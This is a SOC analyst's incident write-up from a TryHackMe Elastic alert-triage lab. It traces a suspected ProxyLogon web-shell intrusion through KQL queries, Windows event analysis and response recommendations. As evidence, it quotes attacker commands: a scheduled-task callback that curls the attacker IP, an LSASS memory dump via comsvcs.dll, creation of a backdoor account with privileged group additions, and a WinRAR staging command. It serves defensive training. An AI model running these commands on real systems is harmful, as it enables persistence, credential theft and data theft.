# Elastic Web Attack Investigation

**Lab:** Alert Triage with Elastic — TryHackMe  
**Analyst:** Quy Pham  
**Incident date:** July 20, 2025  
**Assessment:** True positive — correlated malicious activity  
**Recommended priority:** Critical

## Executive summary

I investigated five related alerts involving `winserv2019.some.corp`. Starting with suspicious POST requests from `203.0.113.55`, I pivoted through web logs, Windows authentication events, process activity, and account-management events to reconstruct the attack sequence.

The evidence shows requests to `/ecp/proxyLogon.ecp`, followed by command-bearing requests to `/errorEE.aspx`. Later activity included a confirmed Administrator RDP logon from the same source IP (`203.0.113.55`), creation of `svc_backup`, commands adding that account to privileged groups, and a WinRAR command targeting user documents and administrative scripts. The original investigation notes also recorded a scheduled-task command and an LSASS dumping command submitted through the suspected web shell.

Taken together, these findings support a true-positive verdict and urgent escalation. The supplied evidence does not establish the exact exploit, successful credential extraction, how the Administrator credentials were obtained, or completed data exfiltration.

## Contents

- [Alert overview](#alert-overview)
- [Attack timeline](#attack-timeline)
- [Investigation](#investigation)
- [Key indicators and artifacts](#key-indicators-and-artifacts)
- [Verdict and evidence gaps](#verdict-and-evidence-gaps)
- [Recommended response](#recommended-response)
- [Lessons learned](#lessons-learned)

## Alert overview

| Alert time | Alert | Severity | Alert ID |
|---|---|---|---|
| 04:38:40 | Web Requests Indicating File Upload | High | SOC-20250720-0012 |
| 04:45:31 | GET Requests to ASPX File with Query Parameters | High | SOC-20250720-0013 |
| 05:11:22 | Administrator Access Outside of Business Hours | High | SOC-20250720-0014 |
| 05:13:10 | New User Account Created | Critical | SOC-20250720-0015 |
| 05:13:15 | Unusual Command-Line Behavior: Privilege Changes | Critical | SOC-20250720-0016 |

The first two alerts identify `203.0.113.55` as the client and `winserv2019.some.corp` as the destination. The later alert cards identify the same host and the `Administrator` account.

![Five related alerts in the lab queue](media/01-alert-overview.png)

## Attack timeline

All entries below are on **July 20, 2025**. This sequence correlates events; it does not prove every causal link between them.

| Time | Activity | Evidence and interpretation |
|---|---|---|
| 04:38:40–04:43:54 | Three POST requests to `/ecp/proxyLogon.ecp` | Web logs show `python-requests/2.25.1` and HTTP 200 responses; suspected exploitation activity. |
| 04:45:31–04:47:17 | Commands submitted through `/errorEE.aspx?cmd=` | Requests include identity, privilege, host, network, account, and share discovery. |
| 04:48:24 | Scheduled-task creation command | Notes record a `WinUpdate` task intended to contact the source IP every five minutes; task creation success is unconfirmed. |
| 04:50:43–04:51:52 | Service and file-system discovery | Requests include service enumeration and a search of `C:\inetpub`. |
| 04:58:20–05:05:17 | Suspected credential-access attempt | Notes record `Get-Process lsass` and a `comsvcs.dll` memory-dump command; successful dumping is unconfirmed. |
| 05:11:22.545 UTC | Administrator RDP logon from the web-attack source IP | Event 4624, Logon Type 10, confirms `SOME\Administrator` logged on remotely from `203.0.113.55`. |
| 05:11:27–05:12:59 | Desktop processes and command prompt | Notes describe `userinit.exe`, `explorer.exe`, and then `cmd.exe` after the confirmed RDP logon; correlate session identifiers to associate these processes definitively. |
| 05:13:09–05:13:10 | Creation of `svc_backup` | Notes record a domain-account creation command; the Security screenshot shows Event 4720 at 05:13:10.009. |
| 05:13:15–05:13:28 | Group membership changes | Three `net.exe` commands are followed by Event 4732 records. |
| 05:17:55.918 | Archive command targeting documents and scripts | `Rar.exe` is launched with output path `C:\Temp\finance_it_archive.rar`; archive completion and outbound transfer are unconfirmed. |

## Investigation

### 1. Validate the suspicious web requests

**Alert:** Web Requests Indicating File Upload

![Web Requests Indicating File Upload](media/02-web-upload-alert.png)

**Investigation objective:** Review POST requests from the alert’s client IP to identify the targeted resource and request pattern.

**ProxyLogon context:** `/ecp/proxyLogon.ecp` is an internal backend endpoint of the **Exchange Control Panel (ECP)** used for authentication between proxied Exchange components. In the ProxyLogon exploit chain, **CVE-2021-26855**, a server-side request forgery (SSRF) vulnerability, enables requests to backend endpoints. Attackers can abuse the authentication endpoint to obtain an authenticated ECP session, then chain additional vulnerabilities to deploy a web shell. This makes the observed requests relevant to suspected Exchange exploitation, although the path alone does not confirm the full exploit chain. [Technical reference: ProxyLogon root-cause analysis](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-26855.html).

I filtered the web logs for POST requests from the alert's client IP.

```kql
_index:weblogs and client.ip:203.0.113.55 and http.request.method:"POST"
```

**Observed:** Three requests targeted `/ecp/proxyLogon.ecp` at 04:38:40, 04:39:23, and 04:43:54. Each used `python-requests/2.25.1` and received HTTP 200.

**Assessment:** The endpoint and automated client are suspicious in the context of the subsequent activity. The request path alone does not establish which vulnerability was exploited, and an HTTP 200 response does not prove successful exploitation or file upload.

![POST requests targeting the proxyLogon endpoint](media/03-post-request-results.png)

### 2. Investigate the suspected web shell

**Alert:** GET Requests to ASPX File with Query Parameters

![GET Requests to ASPX File with Query Parameters](media/04-aspx-command-alert.png)

**Investigation objective:** Inspect the commands supplied to the ASPX endpoint and identify follow-on activity.

The next alert reported GET requests to `errorEE.aspx` containing a `cmd=` parameter. I pivoted to those requests.

```kql
_index:weblogs and client.ip:203.0.113.55 and http.request.method:"GET" and errorEE.aspx
```

**Observed:** The query returned 20 documents. Visible requests used `curl/8.14.1` and included commands consistent with discovery and post-compromise activity.

| Purpose | Commands recorded in the evidence |
|---|---|
| Identify execution context | `whoami`, `whoami /priv`, `whoami /groups`, `hostname` |
| Inspect network configuration and connections | `ipconfig /all`, `netstat -ano` |
| Enumerate accounts and privileged groups | `net user`, `net localgroup administrators`, `net group "Domain Admins" /domain` |
| Discover shares | `net share` |
| Enumerate services | `sc query state= all` |
| Explore the web directory | `dir C:\inetpub\ /s /tw /od` |
| Inspect DNS settings | Notes describe a `wmic nicconfig` command requesting `DNSServerSearchOrder`; the complete command was not retained. |

**Assessment:** Repeated requests supplying operating-system commands strongly support suspected web-shell use. The web logs establish that commands were submitted; they do not independently show each command's output or successful execution.

![Command-bearing requests to errorEE.aspx](media/05-web-shell-discovery.png)

The notes record the following scheduled-task command at **04:48:24**:

```text
schtasks /create /tn "WinUpdate" /tr "cmd.exe /c curl http://203.0.113.55/ping.php >> C:\Windows\Temp\beacon.log 2>&1" /sc minute /mo 5
```

This command attempts to establish a recurring callback and write its output to `beacon.log`. Task-creation events, task artifacts, and subsequent network activity are needed to confirm persistence.

The notes also record a suspected credential-access sequence between **04:58:20 and 05:05:17**: two `Get-Process lsass` commands followed by:

```text
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 580 C:\Windows\Temp\lsass.dmp full
```

This is an attempted memory dump targeting PID 580, described in the notes as LSASS. The supplied screenshots do not display the full credential-access sequence. Confirm the process identity, execution result, and dump-file creation before claiming credentials were obtained.

![Additional web requests including task and service discovery activity](media/06-web-shell-follow-on.png)

### 3. Correlate the Administrator logon

**Alert:** Administrator Access Outside of Business Hours

![Administrator Access Outside of Business Hours](media/08-administrator-alert.png)

**Investigation objective:** Validate the successful logon and correlate it with subsequent process and account activity.

I investigated the out-of-hours Administrator alert with the following recorded query:

```kql
@timestamp >= "2025-07-20T05:11:22" and winlog.event_id:4624 and host.name:winserv2019.some.corp and winlog.event_data.TargetUserName:Administrator
```

![Successful Administrator RDP logon showing the source IP and RemoteInteractive logon type](media/17-administrator-rdp-logon-details.png)

**Observed:** The updated screenshot and supplied JSON confirm one successful **RDP / RemoteInteractive logon** to `winserv2019.some.corp` at **05:11:22.545 UTC**, using `SOME\Administrator` from **`203.0.113.55`**.

| Event field | Value | Interpretation |
|---|---|---|
| `@timestamp` | `2025-07-20T05:11:22.545Z` | Time of the logon event, in UTC |
| `winlog.event_id` | `4624` | Successful logon |
| Target account | `SOME\Administrator` | Account that logged on, distinct from the subject account `WINSERV2019$` |
| `winlog.event_data.LogonType` | `10` | RemoteInteractive / RDP logon |
| `winlog.event_data.IpAddress` | `203.0.113.55` | Same source IP as the earlier POST and web-shell requests |
| `winlog.event_data.IpPort` | `3389` | Recorded **source port**, not evidence of the destination port |
| `winlog.event_data.ElevatedToken` | `Yes` | Session has an elevated token; this does not establish a privilege-escalation exploit |
| `winlog.event_data.AuthenticationPackageName` | `Negotiate` | Does not alone establish whether Kerberos or NTLM was ultimately used |
| `winlog.record_id` | `17166` | Security event record reference |

**Assessment:** The matching source IP and affected host confirm a shared network source between the earlier web activity and this Administrator RDP logon. Combined with the timing and subsequent account changes, this strongly supports treating the logon as part of the same attack sequence. The evidence does not prove that the Administrator credentials came from the earlier LSASS dumping attempt.

Logon Type **10** is the basis for identifying RDP access. In Event 4624, `IpPort` describes the source port, so the displayed value `3389` should not be relabeled as a destination port. [Microsoft Event 4624 field documentation](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624).



### 4. Investigate account creation

**Alert:** New User Account Created

![New User Account Created](media/16-new-user-account-alert.jpg)

**Investigation objective:** Identify the newly created account and correlate its creation with the Administrator session.

The alert identifies **Administrator** on `winserv2019.some.corp` at **05:13:10.000**, with Critical severity and alert ID **SOC-20250720-0015**. Its trigger reports that a new user was created; the alert card does not identify the new username.

The notes record this command at approximately **05:13:09**:

```text
net user svc_backup Passw0rd123! /add /domain
```

I then reviewed Security account-management events:

```kql
@timestamp >= "2025-07-20T05:13:10.000" and winlog.channel:Security and winlog.task:User Account Management
```

**Observed:** The screenshot includes Event 4720, “A user account was created,” at **05:13:10.009**, followed by account enablement, password-reset-attempt, and account-change events. The original notes identify the new account as `svc_backup`; the collapsed screenshot does not expose the target account fields.

**Assessment:** The account-creation command and subsequent membership changes support creation of an account for continued access. Confirm the target SID and account domain in the expanded events to complete the evidence chain.

![Account-management events following the creation command](media/10-account-management-events.png)

### 5. Validate privilege changes

**Alert:** Unusual Command-Line Behavior: Privilege Changes

![Unusual Command-Line Behavior: Privilege Changes](media/11-privilege-change-alert.png)

**Investigation objective:** Determine which groups were targeted and correlate the commands with membership-change events.

I searched for commands launched from `cmd.exe` by `Administrator`:

```kql
@timestamp >= "2025-07-20T05:13:15" and process.parent.name:cmd.exe and user.name:Administrator
```

**Observed:** Three commands targeted the new account:

| Time | Command | Investigative significance |
|---|---|---|
| 05:13:15.436 | `net localgroup "Server Operators" svc_backup /add` | Attempts to grant membership in Server Operators. |
| 05:13:22.251 | `net localgroup "Remote Desktop Users" svc_backup /add` | Attempts to grant RDP-related group membership; actual access still depends on policy and service configuration. |
| 05:13:27.999 | `net localgroup Administrators svc_backup /add` | Attempts to grant administrative group membership. |

![Commands adding svc_backup to three groups](media/12-group-change-commands.png)

I broadened the search to correlate process activity with membership-change events:

```kql
@timestamp >= "2025-07-20T05:13:15" and (winlog.event_id:4732 or process.parent.name:cmd.exe)
```

Each command is followed closely by an Event 4732 record, supporting successful group additions. For definitive attribution, match the member SID, target group, and subject account in the expanded events. The notes also report corresponding `net1.exe` activity; treat that as related process activity rather than counting it as additional account changes.

**Assessment:** This sequence supports privileged-account persistence. The new account gains privileges; the already privileged Administrator session does not need to escalate simply to issue these commands.

### 6. Identify potential data staging

**Follow-on pivot:** This activity was discovered while investigating the privilege-change alert; no separate archive alert was supplied.

The broader query also revealed `Rar.exe`, launched from `cmd.exe` at **05:17:55.918**. The visible command line is:

```text
"C:\Program Files\WinRAR\rar.exe" a -hpSpring2025! -m5 C:\Temp\finance_it_archive.rar C:\Users\asmith\Documents\* C:\IT\Admin\Scripts\*
```

**Observed:** The command targets both `asmith`'s documents and IT administrative scripts. The working directory is `C:\Users\svc_backup.SOME\`.

**Assessment:** This is consistent with an attempt to package data for staging. The working directory alone does not prove the process ran as `svc_backup`; inspect the process user and logon identifiers. Process creation proves the archiver was launched, not that the archive was successfully written or transferred outside the environment.

![Correlated group-change events and archive command](media/14-group-events-and-archive.png)

## Key indicators and artifacts

These values are investigation pivots from the lab, not independently reputation-checked threat intelligence.

| Type | Value | Context |
|---|---|---|
| Web client / RDP source / callback target | `203.0.113.55` | Shared source for web requests and the confirmed Administrator RDP logon; also the recorded scheduled-task callback target |
| Affected host | `winserv2019.some.corp` | Common host across the alert sequence |
| Privileged account | `SOME\Administrator` | Account described in the notes; Administrator authentication and command activity |
| Newly created account | `svc_backup` | Account creation and privileged group additions |
| HTTP paths | `/ecp/proxyLogon.ecp`, `/errorEE.aspx` | Suspected exploitation and web-shell interaction |
| User agents | `python-requests/2.25.1`, `curl/8.14.1` | Automated web requests |
| Task / callback | `WinUpdate`, `http://203.0.113.55/ping.php` | Intended recurring callback recorded in notes |
| Output paths | `C:\Windows\Temp\beacon.log`, `C:\Windows\Temp\lsass.dmp` | Intended callback output and memory dump; file creation unconfirmed |
| Archive path | `C:\Temp\finance_it_archive.rar` | Intended archive output |
| Collection sources | `C:\Users\asmith\Documents\*`, `C:\IT\Admin\Scripts\*` | Inputs to the archive command |

## Verdict and evidence gaps

**Classification: True positive.** The command-bearing web requests, confirmed Administrator RDP logon from the same source IP, account creation, privileged group changes, and archive command form a coherent malicious sequence in this lab. I would recommend critical-priority escalation because the activity involves privileged access and potential credential and data exposure.

An automated user agent, an out-of-hours logon, or an archiving tool can each be benign in isolation. The correlated behavior is the basis for this verdict. In a live investigation, validate change records and authorized administrative activity as part of triage.

| Conclusion | Evidence boundary |
|---|---|
| Suspected exploitation and web-shell use | Exact vulnerability, uploaded file contents, and command outputs are not supplied. |
| Scheduled-task persistence attempt | Full command is retained in notes; task creation and callbacks are not confirmed. |
| Suspected LSASS dumping attempt | Recorded in notes; dump creation and credential extraction are not confirmed. |
| Confirmed Administrator RDP logon from the web-attack source | Event 4624 confirms Logon Type 10 and source `203.0.113.55`; how credentials were obtained and any link to LSASS dumping remain unresolved. |
| Account creation and privileged group changes | Supported by notes, commands, and matching event timing; expand events to verify account and group SIDs. |
| Potential data staging | Archive command is visible; completed archive creation and exfiltration are not confirmed. |
| Known scope | One identified host; broader compromise has not been established. |

## Recommended response

**Work completed:** Reviewed the supplied alert evidence, correlated the documented queries and findings, reconstructed the sequence, and recorded the assessment. No containment, eradication, credential reset, or production change is documented.

1. **Contain and preserve evidence.** Escalate to incident response and isolate or restrict the affected server according to the response playbook. Preserve relevant volatile evidence, web/WAF logs, Security events, process telemetry, and suspicious files before cleanup.
2. **Secure affected accounts.** Investigate and disable unauthorized `svc_backup` access, remove unauthorized memberships, and revoke associated sessions. Reset exposed credentials in coordination with containment and determine whether additional domain-level response is required.
3. **Validate persistence and credential access.** Inspect `errorEE.aspx`, the `WinUpdate` task, the callback log, and the suspected LSASS dump. Confirm their creation and execution through endpoint evidence.
4. **Scope the incident.** Hunt across hosts for the client IP, web paths, account, task name, commands, and file paths. Correlate logon IDs and SIDs to determine whether `svc_backup` was used elsewhere.
5. **Investigate data exposure.** Determine whether the archive exists, identify its contents, and review outbound transfers after its creation. Do not classify the activity as confirmed exfiltration without transfer evidence.
6. **Eradicate and recover.** After evidence collection, remove verified malicious artifacts, remediate the confirmed entry point, and restore or rebuild the host as warranted. Monitor for recurring callbacks, account changes, and renewed web-shell activity.

For escalation, include the affected host and accounts, timeline, saved queries, screenshots, confirmed findings, open questions, and containment status.

## Lessons learned

- Correlate alerts across web, authentication, process, and account-management telemetry to reconstruct the incident.
- Separate command submission, process execution, and successful outcomes. Each requires different evidence.
- Correlate group-change commands with Event 4732 and verify the member and group fields rather than relying only on timing.
- Treat file archiving as potential staging until file and network evidence establish what happened next.
- Record a bounded time range, timezone, host, and relevant account identifiers when reproducing searches. The queries above preserve the original investigation searches and were not rerun for this write-up.
